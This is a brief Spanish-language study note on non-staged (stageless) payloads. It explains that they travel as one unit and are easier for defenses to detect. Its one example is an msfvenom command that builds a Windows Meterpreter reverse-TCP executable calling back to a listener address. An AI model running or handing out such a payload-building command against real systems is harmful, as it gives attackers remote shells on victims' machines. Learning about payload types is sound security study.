Envían los paquetes de forma no fragmentada

Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
## Ventajas
Al ser mucho más grande se incluye todo el código  necesario para poder desplegar o ejecutar la función deseada
es más rápida porque no requiere muchas etapas

## Ejemplos
```
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows LHOST=192.168.111.45 LPORT=4646 -f exe -o reverse.exe
```
